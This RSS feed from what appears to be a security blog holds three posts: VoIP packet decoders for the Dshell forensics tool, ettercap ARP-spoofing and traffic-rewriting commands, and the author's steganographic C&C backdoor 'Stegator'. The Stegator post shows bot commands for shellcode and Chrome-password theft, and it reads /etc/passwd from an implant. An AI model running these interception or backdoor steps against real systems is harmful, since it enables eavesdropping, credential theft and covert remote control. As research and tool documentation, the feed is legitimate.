<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>M</title>
    <description>test</description>
    <link>/</link>
    <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Fri, 21 Oct 2016 22:55:19 +0100</pubDate>
    <lastBuildDate>Fri, 21 Oct 2016 22:55:19 +0100</lastBuildDate>
    <generator>Jekyll v3.2.0</generator>
    
      <item>
        <title>SIP and RTP decoders for Dshell</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/USArmyResearchLab/Dshell&quot;&gt;Dshell&lt;/a&gt; is an extensible network forensic analysis framework and enables rapid development of plugins to support the dissection of network packet captures.&lt;/p&gt;

&lt;p&gt;While I was testing some VoIP packets, I discover that doesnâ€™t exist VoIP specific decoders, so I created the first one to detect SIP Request and Response packets, and a second decoder to extract all the information for RTP packets used in a VoIP communication.&lt;/p&gt;

&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/j0bfx1v.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;sip-decoder&quot;&gt;SIP decoder&lt;/h3&gt;

&lt;p&gt;SIP &lt;a href=&quot;https://www.ietf.org/rfc/rfc3261.txt&quot;&gt;RFC 3261&lt;/a&gt; indicate that SIP is a text-based protocol with syntax similar to that of HTTP. There are two different types of SIP messages:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Requests initiate a SIP transaction between two SIP entities for establishing, controlling, and terminating sessions.&lt;/li&gt;
  &lt;li&gt;Responses are send by the user agent server indicating the result of a received request.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A SIP session setup example can be similar to this one:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;       Alice's  . . . . . . . . . . . . . . . . . . . .  Bob's
      softphone                                        SIP Phone
         |                |                |                |
         |    INVITE F1   |                |                |
         |---------------&amp;gt;|    INVITE F2   |                |
         |  100 Trying F3 |---------------&amp;gt;|    INVITE F4   |
         |&amp;lt;---------------|  100 Trying F5 |---------------&amp;gt;|
         |                |&amp;lt;-------------- | 180 Ringing F6 |
         |                | 180 Ringing F7 |&amp;lt;---------------|
         | 180 Ringing F8 |&amp;lt;---------------|     200 OK F9  |
         |&amp;lt;---------------|    200 OK F10  |&amp;lt;---------------|
         |    200 OK F11  |&amp;lt;---------------|                |
         |&amp;lt;---------------|                |                |
         |                       ACK F12                    |
         |-------------------------------------------------&amp;gt;|
         |                   Media Session                  |
         |&amp;lt;================================================&amp;gt;|
         |                       BYE F13                    |
         |&amp;lt;-------------------------------------------------|
         |                     200 OK F14                   |
         |-------------------------------------------------&amp;gt;|
         |                                                  |
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The Session Initiation Protocol (SIP) decoder will extract the Call ID, User agent, Codec, Method, SIP call, Host, and Client MAC address from every SIP request or response packet found in the given pcap. For example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip &amp;lt;pcap&amp;gt; 

&amp;lt;-- SIP Request --&amp;gt; 
Timestamp: 2016-09-21 22:44:28.220185 UTC - Protocol: UDP - Size: 435 bytes
Sequence and Method: 1 ACK
From: 10.5.1.8:5060 (00:20:80:a1:13:db) to 10.5.1.7:5060 (15:2a:01:b4:0f:47)
Via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK940bdac4-8a13-1410-9e58-08002772a6e9;rport
SIP call: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9  --&amp;gt;  &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
Call ID: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC

--&amp;gt; SIP Response &amp;lt;-- 
Timestamp: 2016-09-21 22:44:27.849761 UTC - Protocol: UDP - Size: 919 bytes
Sequence and Method: 1 INVITE
From: 10.5.1.7:5060 (02:0a:40:12:30:23) to 10.5.1.8:5060 (d5:02:03:94:31:1b)
Via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
SIP call: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9  --&amp;gt;  &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
Call ID: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
Codec selected: PCMU 
Rate selected: 8000 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To obtain and show a detailed output we can use the &lt;code class=&quot;highlighter-rouge&quot;&gt;--sip_showpkt&lt;/code&gt; option:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip --sip_showpkt &amp;lt;pcap&amp;gt; 

--&amp;gt; SIP Response &amp;lt;-- 
Timestamp: 2016-09-21 22:44:25.360974 UTC - Protocol: UDP - Size: 349 bytes
From: 10.5.1.7:5060 (15:2a:01:b4:0f:47) to 10.5.1.8:5060 (00:20:80:a1:13:db) 
SIP/2.0 100 Trying
content-length: 0
via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
from: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9
to: &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;
cseq: 1 INVITE
call-id: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC

--&amp;gt; SIP Response &amp;lt;-- 
Timestamp: 2016-09-21 22:44:25.387780 UTC - Protocol: UDP - Size: 585 bytes
From: 10.5.1.7:5060 (15:2a:01:b4:0f:47) to 10.5.1.8:5060 (00:20:80:a1:13:db)
SIP/2.0 180 Ringing
content-length: 0
via: SIP/2.0/UDP 10.5.1.8:5060;branch=z9hG4bK26a8d5c4-8a13-1910-9d58-08002772a6e9;rport=5060;received=10.5.1.8
from: &quot;M&quot; &amp;lt;sip:M@10.5.1.8&amp;gt;;tag=0ba2d5c4-8a13-1910-9d56-08002772a6e9
require: 100rel
rseq: 694867676
user-agent: Ekiga/4.0.1
to: &quot;miguel&quot; &amp;lt;sip:demo-alice@10.5.1.7&amp;gt;;tag=84538c9d-ba7e-e611-937f-68a3c4f0d6ce
contact: &quot;miguel&quot; &amp;lt;sip:miguel@10.5.1.7&amp;gt;
cseq: 1 INVITE
allow: INVITE,ACK,OPTIONS,BYE,CANCEL,SUBSCRIBE,NOTIFY,REFER,MESSAGE,INFO,PING,PRACK
call-id: 0ba2d5c4-8a13-1910-9d57-08002772a6e9@M-PC
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;If your packets Ethernet is being replaced by Linux Cooked Capture we can use the next options:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d sip --no-vlan --layer2=sll.SLL &amp;lt;pcap&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;And to obtain statistics about your SIP packets we can use tshark:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tshark -q -r &amp;lt;pcap&amp;gt; -Y sip -z sip,stat

===================================================================
SIP Statistics

Number of SIP messages: 28
Number of resent SIP messages: 8

* SIP Status Codes in reply packets
  SIP 180 Ringing         :     1 Packets
  SIP 200 OK              :     5 Packets
  SIP 100 Trying          :     1 Packets

* List of SIP Request methods
  INVITE          :     4 Packets
  PRACK           :     1 Packets
  INFO            :     2 Packets
  ACK             :     1 Packets
  PUBLISH         :    10 Packets
  CANCEL          :     2 Packets
  BYE             :     1 Packets

* Average setup time 2447 ms
 Min 2447 ms
 Max 2447 ms
===================================================================
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;rtp-decoder&quot;&gt;RTP decoder&lt;/h3&gt;

&lt;p&gt;RTP &lt;a href=&quot;https://www.ietf.org/rfc/rfc3550.txt&quot;&gt;RFC 3550&lt;/a&gt; provides end-to-end network transport functions suitable for applications transmitting real-time data, such as audio, video or simulation data, over multicast or unicast network services.&lt;/p&gt;

&lt;p&gt;The RTP Payload is defined in the next RFCs and links:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc2198&quot;&gt;RFC 2198&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://tools.ietf.org/html/rfc4855&quot;&gt;RFC 4855&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.iana.org/assignments/rtp-parameters/rtp-parameters.xhtml&quot;&gt;RTP Parameters&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The real-time transport protocol (RTP) decoder will extract the Hosts, Payload Type, Synchronization source, 
Sequence Number, Padding, Marker and Client MAC address from every RTP packet found in the given pcap. For example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Dshell&amp;gt; decode -d rtp &amp;lt;pcap&amp;gt; 

    rtp 2002-07-26 07:19:10        10.1.6.18:2006  --       10.1.3.143:5000  ** 
        From: 10.1.6.18 (00:08:21:91:64:60) to 10.1.3.143 (00:04:76:22:20:17) 
        Payload Type (7 bits): PCMA - Audio - 8000 Hz - 1 Channel
        Sequence Number (16 bits): 9825
        Timestamp (32 bits): 54240 
        Synchronization source (32 bits): 4090175489
        Arrival Time: 1027664350.17
        Contributing source (32 bits): 0, Padding (1 bit): 0, Extension (1 bit): 0, Marker (1 bit): 0
    **
    rtp 2002-07-26 07:19:10       10.1.3.143:5000  --        10.1.6.18:2006  ** 
        From: 10.1.3.143 (00:04:76:22:20:17) to 10.1.6.18 (00:d0:50:10:01:66) 
        Payload Type (7 bits): PCMA - Audio - 8000 Hz - 1 Channel
        Sequence Number (16 bits): 59364
        Timestamp (32 bits): 55680 
        Synchronization source (32 bits): 3739283087
        Arrival Time: 1027664350.2
        Contributing source (32 bits): 0, Padding (1 bit): 0, Extension (1 bit): 0, Marker (1 bit): 0
    **

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Some data, to compare, obtained with tshark:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# tshark -q -r &amp;lt;pcap&amp;gt; -Y rtp -z rtp,streams
========================= RTP Streams ========================
Src IP addr  Port    Dest IP addr  Port       SSRC          Payload  Pkts         Lost   Max Delta(ms)  Max Jitter(ms) Mean Jitter(ms) Problems?
 10.1.3.143  5000       10.1.6.18  2006 0xDEE0EE8F ITU-T G.711 PCMA   236     0 (0.0%)           34.83            0.83            0.37 
 10.1.6.18  2006      10.1.3.143  5000 0xF3CB2001 ITU-T G.711 PCMA   229     1 (0.4%)           86.12            7.34            2.84 X

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 17 Oct 2016 00:00:00 +0100</pubDate>
        <link>/Dshell_VoIP_decoders.html</link>
        <guid isPermaLink="true">/Dshell_VoIP_decoders.html</guid>
        
        
      </item>
    
      <item>
        <title>MITM with ettercap</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://ettercap.github.io/ettercap/&quot;&gt;Ettercap&lt;/a&gt; is a comprehensive suite for man in the middle attacks. It features sniffing of live connections, content filtering on the fly and many other interesting tricks. It supports active and passive dissection of many protocols and includes many features for network and host analysis.&lt;/p&gt;

&lt;h3 id=&quot;basic-sniffing&quot;&gt;Basic Sniffing&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -Tzq -i eth0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;To sniff traffic between 2 hosts:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -i eth0 -Tq -M ARP:remote /victim_ip_A/ /victim_ip_B/
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Capture traffic on a certain port only:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -i eth0 -T -M arp /192.168.1.1 / /192.168.1.10-20/23
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;mitm&quot;&gt;MITM&lt;/h3&gt;

&lt;p&gt;Filter example:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (tcp.dst == 1234 &amp;amp;&amp;amp; search(DECODED.data,&quot;2016-10-03&quot;)){
        msg(&quot;Match date...\n&quot;);
        replace(&quot;2016-10-03&quot;,&quot;2017-10-03&quot;);
        replace(&quot;118.186.71.134&quot;,&quot;111.222.33.444&quot;);
        replace(&quot;PASw0rD&quot;,&quot;NOPassw&quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Compile the filter:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# etterfilter -o POC.ef POC.filter
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Launch ettercap:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ettercap -T -q -i eth0 -F POC.ef -M ARP
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Wed, 21 Sep 2016 00:00:00 +0100</pubDate>
        <link>/Ettercap.html</link>
        <guid isPermaLink="true">/Ettercap.html</guid>
        
        
      </item>
    
      <item>
        <title>Stegator</title>
        <description>&lt;p&gt;Some months ago I discover &lt;a href=&quot;https://github.com/byt3bl33d3r/gcat&quot;&gt;Gcat&lt;/a&gt; and &lt;a href=&quot;https://github.com/PaulSec/twittor&quot;&gt;Twittor&lt;/a&gt; which inspired me to write a similar C&amp;amp;C backdoor service using steganography, not only to protect the messages encrypting the source, but also to protect and hide the messages or activity into images.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/1modm/stegator&quot;&gt;&lt;strong&gt;Stegator&lt;/strong&gt;&lt;/a&gt; is a Python based backdoor that uses Steganography and a Cloud Image Service as a command and control server.&lt;/p&gt;

&lt;p&gt;The C&amp;amp;C service insert into the images the commands using a password and the utility steghide, then the images are uploaded into the Cloud Image Service with an specific uuid used by the agent (implant) service to retrieve the image, extract the command and execute in the infected host. Once the results are obtained then are uploaded into the Cloud Image Service to be available for the C&amp;amp;C server to get the results.&lt;/p&gt;

&lt;h3 id=&quot;screenshot&quot;&gt;Screenshot&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/Z5lqbfl.png&quot; alt=&quot;Screenshot&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;usage&quot;&gt;Usage&lt;/h3&gt;

&lt;p&gt;The C&amp;amp;C server offers an â€˜interactiveâ€™ shell which offers few commands that are:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; help


 cleanup - Clean Cloud Service images
 refresh - Refresh C&amp;amp;C control and ping all bots
 bots - List active bots
 commands - List executed commands
 retrieve &amp;lt;jobid&amp;gt; - Retrieve jobid command
 cmd &amp;lt;MAC ADDRESS&amp;gt; command - Execute the command on the bot
 shellcode &amp;lt;MAC ADDRESS&amp;gt; shellcode - Load and execute shellcode in memory (Windows only)
 scanner &amp;lt;MAC ADDRESS&amp;gt; &amp;lt;IP&amp;gt;:&amp;lt;PORT&amp;gt; - Port scanner example: scanner 0:0:0:0 192.168.1.1:22,80,443
 chromepasswords &amp;lt;MAC ADDRESS&amp;gt; - Retrieve Chrome Passwords from bot (Windows only)
 help - Print this usage
 exit - Exit the client


C&amp;amp;C console &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Once youâ€™ve deployed the backdoor on a couple of systems, you can check available clients using the bots command:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; bots
Bot: 04:D6:27:72:A3:E9 Windows-7-6.1.7601-SP1
Bot: 68:A3:C4:F0:98:CE Linux-4.4.0-23-generic-x86_64-with-Ubuntu-16.04-xenial
Bot: 04:00:72:3F:D6:98 Linux-3.16.0-4-amd64-x86_64-with-debian-8.2
C&amp;amp;C console &amp;gt; 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;The output is the MAC address which is used to uniquely identifies the system but also gives you OS information the implant is running on.&lt;/p&gt;

&lt;p&gt;Letâ€™s issue a command to an implant:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; cmd 04:00:72:3F:D6:98 cat /etc/passwd  
[+] Downloading image from Cloud Service...
[+] Uploaded image to Cloud Service
[+] Steganography applied, image saved
[+] Sent command cat /etc/passwd with jobid: 631f4ee7328244b8b462876e1f8dd753
C&amp;amp;C console &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Lets get the results!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; retrieve 631f4ee7328244b8b462876e1f8dd753
631f4ee7328244b8b462876e1f8dd753: 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
Debian-exim:x:104:109::/var/spool/exim4:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
statd:x:106:65534::/var/lib/nfs:/bin/false
avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:109:116:MySQL Server,,,:/nonexistent:/bin/false
postfix:x:110:117::/var/spool/postfix:/bin/false
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
haproxy:x:113:121::/var/lib/haproxy:/bin/false
proftpd:x:114:65534::/run/proftpd:/bin/false
ftp:x:115:65534::/srv/ftp:/bin/false

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Retrieve previous commands&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C&amp;amp;C console &amp;gt; commands
631f4ee7328244b8b462876e1f8dd753: 'cat /etc/passwd' on 04:00:72:3F:D6:98
97ee81e0647a4f248ac47c68e8b25b88: 'ipconfig' on 04:D6:27:72:A3:E9
C&amp;amp;C console &amp;gt; 

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;cast&quot;&gt;Cast&lt;/h3&gt;
&lt;p&gt;&lt;a href=&quot;https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw?autoplay=1&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/4oo26ixuqfzyknztyamw8qgdw.png&quot; alt=&quot;cast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Sat, 16 Jul 2016 00:00:00 +0100</pubDate>
        <link>/stegator.html</link>
        <guid isPermaLink="true">/stegator.html</guid>
        
        
      </item>
    
  </channel>
</rss>
